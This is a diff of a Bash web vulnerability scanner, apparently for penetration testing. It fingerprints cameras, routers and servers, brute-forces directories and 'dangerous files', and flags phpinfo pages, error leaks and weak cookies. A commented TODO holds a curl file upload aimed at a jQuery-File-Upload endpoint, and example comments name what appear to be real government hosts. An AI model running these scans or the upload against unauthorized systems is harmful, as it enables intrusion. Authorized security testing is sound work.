-	grep --color=never -i "Dahua" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/dahua-web.txt
-	grep --color=never -i "Dell iDRAC" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/idrac.txt
-	grep --color=never -i "WebLogic Server" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/WebLogic.txt
-	grep --color=never -i "Grafana" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/Grafana.txt
-	grep --color=never -i "Fortinet" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/fortinet.txt
-	grep --color=never -i "hikvision" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/hikvision.txt
-	grep --color=never -i "optical network terminal" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/HUAWEI-AR.txt		
+	grep --color=never -i "Dahua" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/dahua-web.txt
+	grep --color=never -i "Dell iDRAC" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/idrac.txt
+	grep --color=never -i "WebLogic Server" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/WebLogic.txt
+	grep --color=never -i "Grafana" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/Grafana.txt
+	grep --color=never -i "Fortinet" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/fortinet.txt
+	grep --color=never -i "hikvision" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/hikvision.txt
+	grep --color=never -i "optical network terminal" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/HUAWEI-AR.txt		
 
-	grep --color=never -i "ONT-4G" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' > ../servicios/ZTE-ONT-4G.txt
-	grep --color=never -i "ONT1GE3FE2P1TVSWZ" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/ZTE-ONT-4G.txt
-	grep --color=never -i "ZTE corp " *webData.txt | grep 'F6' | grep 'ZTE-2017' | cut -d '_' -f1-2 | tr '_' ':' > ../servicios/ZTE-F6XX-2017.txt
-	grep --color=never -i "ZTE corp " *webData.txt | grep 'F6' | grep 'ZTE-2018' | cut -d '_' -f1-2 | tr '_' ':' > ../servicios/ZTE-F6XX-2018.txt
+	grep --color=never -i "ONT-4G" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' > ../servicios/ZTE-ONT-4G.txt
+	grep --color=never -i "ONT1GE3FE2P1TVSWZ" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/ZTE-ONT-4G.txt
+	grep --color=never -i "ZTE corp " *webData.txt 2>/dev/null | grep 'F6' | grep 'ZTE-2017' | cut -d '_' -f1-2 | tr '_' ':' > ../servicios/ZTE-F6XX-2017.txt
+	grep --color=never -i "ZTE corp " *webData.txt 2>/dev/null | grep 'F6' | grep 'ZTE-2018' | cut -d '_' -f1-2 | tr '_' ':' > ../servicios/ZTE-F6XX-2018.txt
 
-	grep --color=never -i ciscoASA *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/ciscoASA.txt
-	grep --color=never -i "Cisco Router" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/ciscoRouter.txt
+	grep --color=never -i ciscoASA *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/ciscoASA.txt
+	grep --color=never -i "Cisco Router" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/ciscoRouter.txt
 	
 	#phpmyadmin, etc
 	#responde con 401
@@ -1780,67 +1880,12 @@ cd .enumeracion2/
 		#line=10.0.0.2:443
 	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "_" -f1-2 | uniq | tr "_" ":"   > ../servicios/web401-2.txt
 	# sort
-	sort ../servicios/web401-2.txt | uniq | uniq >> ../servicios/web401.txt
-	rm ../servicios/web401-2.txt
+	sort ../servicios/web401-2.txt 2>/dev/null | uniq | uniq >> ../servicios/web401.txt
+	rm ../servicios/web401-2.txt 2>/dev/null
 	
 cd ..
 ################################
 
-
-
-#################### Realizar escaneo de directorios (2do nivel) a los directorios descubiertos ######################
-if [[ "$PROXYCHAINS" == "n" && "$INTERNET" == 'n' ]]; then 		
-	echo -e "$OKBLUE #################### Realizar escaneo de directorios (2do nivel) a los directorios descubiertos ######################$RESET"
-	cat .enumeracion2/*webdirectorios.txt | egrep -v '401|403' | uniq > logs/enumeracion/webdirectorios_uniq.txt
-	while IFS= read -r line
-	do		
-		echo -e "\n\t########### $line #######"										
-		#line= 200	https://inscripcion.notariadoplurinacional.gob.bo:443/manual/ (Listado directorio activo)	 ,
-		while true; do
-			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
-			script_instancias=$((`ps aux | grep perl | wc -l` - 1)) 		
-			if [[ $free_ram -gt $MIN_RAM  && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]]
-			then
-				if [[ ${line} != *"Listado directorio"*  &&  ${line} != *"wp-"* &&  ${line} != *".action"* &&  ${line} != *"index"*  ]] ; then
-					proto=`echo $line | cut -d ":" -f 1 | cut -d ' ' -f2` #  http/https
-					host_port=`echo $line | cut -d "/" -f 3` # 190.129.69.107:80							
-					host=`echo $host_port | cut -d ":" -f 1` #puede ser subdominio tb
-					port=`echo $host_port | cut -d ":" -f 2`		
-					path_web=`echo $line | cut -d "/" -f4 | tr '[:upper:]' '[:lower:]'` #minuscula
-				
-					if [[ ${path_web} != *"."* && ${path_web} != *"manual"* && ${path_web} != *"dashboard"* && ${path_web} != *"docs"* && ${path_web} != *"license"* && ${path_web} != *"wp"* && ${path_web} != *"aspnet_client"*  && ${path_web} != *"autodiscover"*  && ${path_web} != *"manager/html"* && ${path_web} != *"manual"* && ${path_web} != *"manual"*  ]];then   # si es un directorio (no un archivo) y el listado de directorios no esta habilitado
-
-						egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
-						greprc=$?						
-						if [[ $greprc -eq 1 ]]; then	
-							waitWeb 2.5
-							echo -e "\t\t[+] Enumerando directorios de 2do nivel ($path_web)" 
-							web-buster.pl -r 0 -t $host -p $port -s $proto -h $hilos_web -d "/$path_web/" -m folders >> logs/enumeracion/"$host"_"$port"_webdirectorios2.txt &
-
-							web-buster.pl -r 0 -t $host -p $port -s $proto -h $hilos_web -d "/$path_web/" -m archivosPeligrosos -o 0 | egrep --color=never "^200" >> .vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
-						fi		
-						
-						#TODO
-						#curl -F "files=@/usr/share/lanscanner/info.php" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php > logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt
-						#grep "info.php" logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt > .vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt		
-					else
-						echo -e "\t[-] No vale la pena escanear este directorio "
-					fi				
-					sleep 1
-				else
-					echo -e "\t[-] El listado de directorios esta activo o es un directorio de wordpress "
-				fi #revisar q el listado de directorio esta habilitado
-				
-				break		
-			else				
-				script_instancias=`ps aux | grep perl | wc -l`
-				echo -e "\t[-] Maximo número de instancias de perl ($script_instancias) RAM = $free_ram Mb"
-				sleep 3									
-			fi	
-		done #while				
-	done < logs/enumeracion/webdirectorios_uniq.txt
-		
-fi  
 
 # revisar si hay scripts ejecutandose
 while true; do
@@ -1856,124 +1901,70 @@ done	# done true
 ########################
 
 
-##########  filtrar los directorios de segundo nivel que respondieron 200 OK (llevarlos a .enumeracion) ################
-touch logs/enumeracion/canary_webdirectorios2.txt # se necesita al menos 2 archivos *_webdirectorios2.txt
-echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web (directorios de segundo nivel)"
-egrep --color=never "^200" logs/enumeracion/*webdirectorios2.txt 2>/dev/null| while read -r line ; do	
-	#line = 200	http://sigec.ruralytierras.gob.bo:80/login/index/
-	#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
-	archivo_origen=`echo $line | cut -d ':' -f1`
-	contenido=`echo $line | cut -d ':' -f2-6`    
-	#echo "archivo_origen $archivo_origen"
-	archivo_destino=$archivo_origen       
-	archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}   	    
-	#200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
-	#echo "contenido $contenido"
-	echo $contenido >> $archivo_destino        
-done
-insert_data
+if [[ $webScaneado -eq 1 ]]; then
+	##########  filtrar los directorios de segundo nivel que respondieron 200 OK (llevarlos a .enumeracion) ################
+	touch logs/enumeracion/canary_webdirectorios2.txt # se necesita al menos 2 archivos *_webdirectorios2.txt
+	echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web (directorios de segundo nivel)"
+	egrep --color=never "^200" logs/enumeracion/*webdirectorios2.txt 2>/dev/null| while read -r line ; do	
+		#line = 200	http://sigec.ruralytierras.gob.bo:80/login/index/
+		#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
+		archivo_origen=`echo $line | cut -d ':' -f1`
+		contenido=`echo $line | cut -d ':' -f2-6`    
+		#echo "archivo_origen $archivo_origen"
+		archivo_destino=$archivo_origen       
+		archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}   	    
+		#200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
+		#echo "contenido $contenido"
+		echo $contenido >> $archivo_destino        
+	done
+	insert_data
 
 
-############ vulnerabilidades relacionados a servidores/aplicaciones web ########
-echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web"	
-#Vulnerabilidades detectada en la raiz del servidor
-echo -e "[i] Revisar vulnerabilidades detectadas en la raiz del servidor"
-egrep "vulnerabilidad=" .enumeracion2/*webData.txt 2>/dev/null| while read -r line ; do	
-	echo -e  "$OKRED[!] Vulnerabilidad detectada $RESET"			
-	#line = .enumeracion2/170.239.123.50_80_webData.txt:Control de Usuarios ~ Apache/2.4.12 (Win32) OpenSSL/1.0.1l PHP/5.6.8~200 OK~~http://170.239.123.50/login/~|301 Moved~ PHP/5.6.8~vulnerabilidad=MensajeError~^
-	archivo_origen=`echo $line | cut -d ':' -f1` #.enumeracion2/192.168.0.36_8080_webData.txt
-	url_vulnerabilidad=`echo $archivo_origen | cut -d "/" -f 2 | cut -d "_" -f1-2 | tr "_" ":"` #192.168.0.36:8080
+	############ vulnerabilidades relacionados a servidores/aplicaciones web ########
+	echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web"	
+	#Vulnerabilidades detectada en la raiz del servidor
+	echo -e "[i] Revisar vulnerabilidades detectadas en la raiz del servidor"
+	egrep "vulnerabilidad=" .enumeracion2/*webData.txt 2>/dev/null| while read -r line ; do	
+		echo -e  "$OKRED[!] Vulnerabilidad detectada $RESET"			
+		#line = .enumeracion2/170.239.123.50_80_webData.txt:Control de Usuarios ~ Apache/2.4.12 (Win32) OpenSSL/1.0.1l PHP/5.6.8~200 OK~~http://170.239.123.50/login/~|301 Moved~ PHP/5.6.8~vulnerabilidad=MensajeError~^
+		archivo_origen=`echo $line | cut -d ':' -f1` #.enumeracion2/192.168.0.36_8080_webData.txt
+		url_vulnerabilidad=`echo $archivo_origen | cut -d "/" -f 2 | cut -d "_" -f1-2 | tr "_" ":"` #192.168.0.36:8080
 
-	if [[ ${url_vulnerabilidad} == *"443"* || ${url_vulnerabilidad} == *"9091"*  ]]; then
-		url_vulnerabilidad="https://$url_vulnerabilidad" #http://192.168.0.36:8080
-	else
-		url_vulnerabilidad="http://$url_vulnerabilidad"
-	fi		
-	
-	vulnerabilidad=`echo $line | cut -d '~' -f7 | sed 's/vulnerabilidad=//' ` #OpenPhpMyAdmin	
-	
-	archivo_destino=$archivo_origen       
-	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   	
-	archivo_destino=${archivo_destino/webdirectorios/$vulnerabilidad}   	
-	archivo_destino=${archivo_destino/webarchivos/$vulnerabilidad}
-	archivo_destino=${archivo_destino/admin/$vulnerabilidad}   	
-	archivo_destino=${archivo_destino/webData/$vulnerabilidad} 
-
-	if [ $vulnerabilidad == 'ListadoDirectorios' ];then				
-		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] ListadoDirectorios"  ; fi
-		contenido=`listDir -url=$url_vulnerabilidad`		
-	fi
-		
-	if [[ $vulnerabilidad == 'OpenPhpMyAdmin' || $vulnerabilidad == 'debugHabilitado' || $vulnerabilidad == 'OpenMikrotik' || $vulnerabilidad == 'divulgacionInformacion' ]];then	
-		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
-		contenido=$url_vulnerabilidad
-	fi
-
-
-	if [ $vulnerabilidad == 'MensajeError' ];then	
-		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] MensajeError \n"  ; fi		
-		contenido=`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
-	fi
-
-	if [[ $vulnerabilidad == 'phpinfo' ]];then	
-		if [ "$VERBOSE" == 's' ]; then echo -e "[+] Posible archivo PhpInfo ($url_vulnerabilidad)"   ; fi
-		echo "archivo_origen $archivo_origen"
-		archivo_phpinfo=`echo "$archivo_origen" | sed 's/webData/phpinfo/'|sed 's/.enumeracion2\///'`
-		#archivo_phpinfo = 127.0.0.1_80_phpinfo.txt.
-		phpinfo.pl -url "\"$url_vulnerabilidad\"" >> logs/vulnerabilidades/$archivo_phpinfo 2>/dev/null				
-		egrep -iq "USERNAME|COMPUTERNAME|ADDR|HOST" logs/vulnerabilidades/$archivo_phpinfo
-		greprc=$?
-		if [[ $greprc -eq 0 ]] ; then													
-			echo -e  "$OKRED[!] Es un archivo phpinfo valido ! $RESET"
-			echo "URL  $url_vulnerabilidad" >> .vulnerabilidades/$archivo_phpinfo
-			echo ""  >> .vulnerabilidades/$archivo_phpinfo
-			grep ':' logs/vulnerabilidades/$archivo_phpinfo >> .vulnerabilidades/$archivo_phpinfo
-			echo -e "\n\n"  >> .vulnerabilidades/$archivo_phpinfo
+		if [[ ${url_vulnerabilidad} == *"443"* || ${url_vulnerabilidad} == *"9091"*  ]]; then
+			url_vulnerabilidad="https://$url_vulnerabilidad" #http://192.168.0.36:8080
 		else
-			echo -e "[i] No es un archivo phpinfo valido"
-		fi	#archivo phpinfo
-	fi
-	echo "archivo_destino $archivo_destino"
-	echo $contenido >> $archivo_destino
-done
-
-##Vulnerabilidades detectadas con web fuzzing
-echo -e "[i] Revisar vulnerabilidades detectadas mediante navegacion forzada"
-egrep -ira "vulnerabilidad=" logs |grep -i '200    ' 2>/dev/null| while read -r line ; do	
-	echo -e  "$OKRED[!] Vulnerabilidad detectada $RESET"		
-	#line= logs/vulnerabilidades/127.0.0.1_80_divulgacionInformacion.txt:200       http://127.0.0.1/phpinfo.php (vulnerabilidad=phpinfo)
-	echo "$line"
-	archivo_origen=`echo $line | cut -d ':' -f1 | cut -d "/" -f3`  # 127.0.0.1_80_divulgacionInformacion.txt
-	echo "archivo_origen $archivo_origen"
-	url_vulnerabilidad=`echo $line | awk '{print $2}'` # http://127.0.0.1/phpinfo.php 
-	vulnerabilidad=`echo $line | awk '{print $3}'| cut -d '=' -f2 | tr -d ')'` #OpenPhpMyAdmin	
-	echo "vulnerabilidad $vulnerabilidad"
-
-	archivo_destino=".vulnerabilidades/$archivo_origen"
-	echo "archivo_destino $archivo_destino"
-
-	if [ $vulnerabilidad == 'ListadoDirectorios' ];then				
-		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] ListadoDirectorios"  ; fi		
-		contenido=`listDir -url=$url_vulnerabilidad`
-		echo "$contenido\n" >> $archivo_destino		
-	fi
+			url_vulnerabilidad="http://$url_vulnerabilidad"
+		fi		
 		
-	if [[ $vulnerabilidad == 'OpenPhpMyAdmin' || $vulnerabilidad == 'debugHabilitado' || $vulnerabilidad == 'OpenMikrotik' ]];then	
-		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
-		contenido=$url_vulnerabilidad
-		echo $contenido >> $archivo_destino
-	fi
+		vulnerabilidad=`echo $line | cut -d '~' -f7 | sed 's/vulnerabilidad=//' ` #OpenPhpMyAdmin	
+		
+		archivo_destino=$archivo_origen       
+		archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   	
+		archivo_destino=${archivo_destino/webdirectorios/$vulnerabilidad}   	
+		archivo_destino=${archivo_destino/webarchivos/$vulnerabilidad}
+		archivo_destino=${archivo_destino/admin/$vulnerabilidad}   	
+		archivo_destino=${archivo_destino/webData/$vulnerabilidad} 
 
-	if [[ $vulnerabilidad == 'divulgacionInformacion' || $vulnerabilidad == 'phpinfo' ]];then	
-		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
+		if [ $vulnerabilidad == 'ListadoDirectorios' ];then				
+			if [ "$VERBOSE" == 's' ]; then  echo -e "[+] ListadoDirectorios"  ; fi
+			contenido=`listDir -url=$url_vulnerabilidad`		
+		fi
+			
+		if [[ $vulnerabilidad == 'OpenPhpMyAdmin' || $vulnerabilidad == 'debugHabilitado' || $vulnerabilidad == 'OpenMikrotik' || $vulnerabilidad == 'divulgacionInformacion' ]];then	
+			if [ "$VERBOSE" == 's' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
+			contenido=$url_vulnerabilidad
+		fi
 
-		if [[ ${url_vulnerabilidad} == *"error"* || ${url_vulnerabilidad} == *"log"* || ${url_vulnerabilidad} == *"dwsync"*  ]];then  			
-			echo -e  "$OKRED[!] Archivo de error o log detectado! ($url_vulnerabilidad) $RESET"			
-			contenido==$url_vulnerabilidad
 
-		else
-			echo -e "[+] Posible archivo PhpInfo ($url_vulnerabilidad)" 
-			archivo_phpinfo=`echo "$archivo_origen" | sed 's/divulgacionInformacion/phpinfo/'`
+		if [ $vulnerabilidad == 'MensajeError' ];then	
+			if [ "$VERBOSE" == 's' ]; then  echo -e "[+] MensajeError \n"  ; fi		
+			contenido=`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
+		fi
+
+		if [[ $vulnerabilidad == 'phpinfo' ]];then	
+			if [ "$VERBOSE" == 's' ]; then echo -e "[+] Posible archivo PhpInfo ($url_vulnerabilidad)"   ; fi
+			echo "archivo_origen $archivo_origen"
+			archivo_phpinfo=`echo "$archivo_origen" | sed 's/webData/phpinfo/'|sed 's/.enumeracion2\///'`
 			#archivo_phpinfo = 127.0.0.1_80_phpinfo.txt.
 			phpinfo.pl -url "\"$url_vulnerabilidad\"" >> logs/vulnerabilidades/$archivo_phpinfo 2>/dev/null				
 			egrep -iq "USERNAME|COMPUTERNAME|ADDR|HOST" logs/vulnerabilidades/$archivo_phpinfo
@@ -1987,27 +1978,83 @@ egrep -ira "vulnerabilidad=" logs |grep -i '200    ' 2>/dev/null| while read -r 
 			else
 				echo -e "[i] No es un archivo phpinfo valido"
 			fi	#archivo phpinfo
-		fi	
-	fi
+		fi
+		echo "archivo_destino $archivo_destino"
+		echo $contenido >> $archivo_destino
+	done
+
+	##Vulnerabilidades detectadas con web fuzzing
+	echo -e "[i] Revisar vulnerabilidades detectadas mediante navegacion forzada"
+	egrep -ira "vulnerabilidad=" logs |grep -i '200    ' 2>/dev/null| while read -r line ; do	
+		echo -e  "$OKRED[!] Vulnerabilidad detectada $RESET"		
+		#line= logs/vulnerabilidades/127.0.0.1_80_divulgacionInformacion.txt:200       http://127.0.0.1/phpinfo.php (vulnerabilidad=phpinfo)
+		echo "$line"
+		archivo_origen=`echo $line | cut -d ':' -f1 | cut -d "/" -f3`  # 127.0.0.1_80_divulgacionInformacion.txt
+		echo "archivo_origen $archivo_origen"
+		url_vulnerabilidad=`echo $line | awk '{print $2}'` # http://127.0.0.1/phpinfo.php 
+		vulnerabilidad=`echo $line | awk '{print $3}'| cut -d '=' -f2 | tr -d ')'` #OpenPhpMyAdmin	
+		echo "vulnerabilidad $vulnerabilidad"
+
+		archivo_destino=".vulnerabilidades/$archivo_origen"
+		echo "archivo_destino $archivo_destino"
+
+		if [ $vulnerabilidad == 'ListadoDirectorios' ];then				
+			if [ "$VERBOSE" == 's' ]; then  echo -e "[+] ListadoDirectorios"  ; fi		
+			contenido=`listDir -url=$url_vulnerabilidad`
+			echo "$contenido\n" >> $archivo_destino		
+		fi
+			
+		if [[ $vulnerabilidad == 'OpenPhpMyAdmin' || $vulnerabilidad == 'debugHabilitado' || $vulnerabilidad == 'OpenMikrotik' ]];then	
+			if [ "$VERBOSE" == 's' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
+			contenido=$url_vulnerabilidad
+			echo $contenido >> $archivo_destino
+		fi
+
+		if [[ $vulnerabilidad == 'divulgacionInformacion' || $vulnerabilidad == 'phpinfo' ]];then	
+			if [ "$VERBOSE" == 's' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
+
+			if [[ ${url_vulnerabilidad} == *"error"* || ${url_vulnerabilidad} == *"log"* || ${url_vulnerabilidad} == *"dwsync"*  ]];then  			
+				echo -e  "$OKRED[!] Archivo de error o log detectado! ($url_vulnerabilidad) $RESET"			
+				contenido==$url_vulnerabilidad
+
+			else
+				echo -e "[+] Posible archivo PhpInfo ($url_vulnerabilidad)" 
+				archivo_phpinfo=`echo "$archivo_origen" | sed 's/divulgacionInformacion/phpinfo/'`
+				#archivo_phpinfo = 127.0.0.1_80_phpinfo.txt.
+				phpinfo.pl -url "\"$url_vulnerabilidad\"" >> logs/vulnerabilidades/$archivo_phpinfo 2>/dev/null				
+				egrep -iq "USERNAME|COMPUTERNAME|ADDR|HOST" logs/vulnerabilidades/$archivo_phpinfo
+				greprc=$?
+				if [[ $greprc -eq 0 ]] ; then													
+					echo -e  "$OKRED[!] Es un archivo phpinfo valido ! $RESET"
+					echo "URL  $url_vulnerabilidad" >> .vulnerabilidades/$archivo_phpinfo
+					echo ""  >> .vulnerabilidades/$archivo_phpinfo
+					grep ':' logs/vulnerabilidades/$archivo_phpinfo >> .vulnerabilidades/$archivo_phpinfo
+					echo -e "\n\n"  >> .vulnerabilidades/$archivo_phpinfo
+				else
+					echo -e "[i] No es un archivo phpinfo valido"
+				fi	#archivo phpinfo
+			fi	
+		fi
 
 
-	if [ $vulnerabilidad == 'MensajeError' ];then	
-		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] MensajeError \n"  ; fi		
-		contenido=`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
-		archivo_phpinfo=`echo "$archivo_destino" | sed 's/archivosDefecto/MensajeError/'`
-		archivo_phpinfo=${archivo_phpinfo/webarchivos/MensajeError}   
-		archivo_phpinfo=${archivo_phpinfo/webdirectorios/MensajeError} 
-		archivo_phpinfo=${archivo_phpinfo/webadmin/MensajeError} 
+		if [ $vulnerabilidad == 'MensajeError' ];then	
+			if [ "$VERBOSE" == 's' ]; then  echo -e "[+] MensajeError \n"  ; fi		
+			contenido=`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
+			archivo_phpinfo=`echo "$archivo_destino" | sed 's/archivosDefecto/MensajeError/'`
+			archivo_phpinfo=${archivo_phpinfo/webarchivos/MensajeError}   
+			archivo_phpinfo=${archivo_phpinfo/webdirectorios/MensajeError} 
+			archivo_phpinfo=${archivo_phpinfo/webadmin/MensajeError} 
 
-		echo $contenido >> $archivo_phpinfo		
-	fi
-	
-	echo -e "\n"
-done
-# insertar datos 
-insert_data
-#################################
+			echo $contenido >> $archivo_phpinfo		
+		fi
+		
+		echo -e "\n"
+	done
+	# insertar datos 
+	insert_data
+	#################################
 
+fi #webScanned
 
 
 	
@@ -2058,13 +2105,13 @@ then
 							echo -e "\t[i] Buscar mas archivos y directorios dentro de  $proto_http://$host:$port/$path_web"
 							echo "Escaneando con la opcion -m archivosPeligrosos"
 							path_web_sin_slash=$(echo "$path_web" | sed 's/\///g')
-							web-buster.pl -r 0 -t $host -p $port -h 50 -d /$path_web -m archivosPeligrosos -s $proto_http >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"-perdidaAutenticacion.txt
+							web-buster.pl -r 0 -t $host -p $port -h 50 -d /$path_web -m archivosPeligrosos -s $proto_http $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"-perdidaAutenticacion.txt
+
+							if [ "$MODE" == "total" ]; then 							
+							web-buster.pl -r 0 -t $host -p $port -h 50 -d /$path_web -m folders -s $proto_http $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_perdidaAutenticacion.txt 
+							fi		
 						fi
-
-						if [ "$MODE" == "total" ]; then 							
-							web-buster.pl -r 0 -t $host -p $port -h 50 -d /$path_web -m folders -s $proto_http >> logs/vulnerabilidades/"$host"_"$port"_perdidaAutenticacion.txt 
-						fi		
-
+						
 						egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_perdidaAutenticacion.txt 2>/dev/null | awk '{print $2}' >> .vulnerabilidades/"$host"_"$port"_perdidaAutenticacion.txt 
 						egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"-perdidaAutenticacion.txt  2>/dev/null | awk '{print $2}' >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"-perdidaAutenticacion.txt
 					else
@@ -2079,6 +2126,104 @@ then
 fi
 sort servicios/admin-web2.txt 2>/dev/null | uniq > servicios/admin-web-fingerprint.txt
 rm servicios/admin-web2.txt 2>/dev/null
+
+
+for line in $(cat $TARGETS); do
+	ip=`echo $line | cut -f1 -d":"`
+	port=`echo $line | cut -f2 -d":"`		
+	proto_http=`echo $line | cut -f3 -d":"`	
+	if [ -z $DOMINIO ] ; then 
+		lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`
+		if [ -z "$lista_hosts" ] ; then 
+				lista_hosts=$ip
+		else
+				lista_hosts=`echo -e "$lista_hosts\n$ip"|uniq`
+		fi
+	else
+		lista_hosts=$ip
+	fi
+
+	for host in $lista_hosts; do
+
+		### OWASP Verification Standard ###
+		#CS-08 Cookies
+		checkCookie $proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port"_CS-08.txt
+		grep 'NO OK' logs/vulnerabilidades/"$host"_"$port"_CS-08.txt > .vulnerabilidades/"$host"_"$port"_CS-08.txt
+
+		#CS-01 Variable en GET
+		egrep 'token|session' logs/enumeracion/"$host"_parametrosGET_uniq_final.txt > .vulnerabilidades/"$host"_"$port"_CS-01.txt 2>/dev/null		
+					
+		#CS-39	API REST y GRAPHQL			
+		grep -i 'graphql' .vulnerabilidades2/"$host"_"$port"_archivosPeligrosos.txt > .vulnerabilidades/"$host"_"$port"_CS-39.txt 2>/dev/null
+
+		#CS-40 Divulgación de información
+		grep -ira 'vulnerabilidad=divulgacionInformacion' logs | awk {'print $2'} > .vulnerabilidades/"$host"_"$port"_CS-40.txt
+		grep -ira 'vulnerabilidad=debugHabilitado' logs | awk {'print $2'} >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
+		grep -ira 'vulnerabilidad=MensajeError' logs | awk {'print $2'} >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
+		grep -ira 'vulnerabilidad=IPinterna' logs | awk {'print $2'} >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
+		grep -ira 'vulnerabilidad=phpinfo' logs | awk {'print $2'} >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
+		for file in $(ls .enumeracion2 .vulnerabilidades2 | grep wpVersion ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Wordpress version:$_\n"' >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
+		for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_perdidaAutenticacion|_webarchivos|_SharePoint|_webdirectorios|_archivosSAP|_webservices|_archivosTomcat|_webserver|_archivosCGI|_CGIServlet|_sapNetweaverLeak' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done  >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
+		cp .vulnerabilidades/"$host"_"$port"_CS-40.txt logs/vulnerabilidades/"$host"_"$port"_CS-40.txt 2>/dev/null
+
+
+		#CS-41 Exposición de usuarios
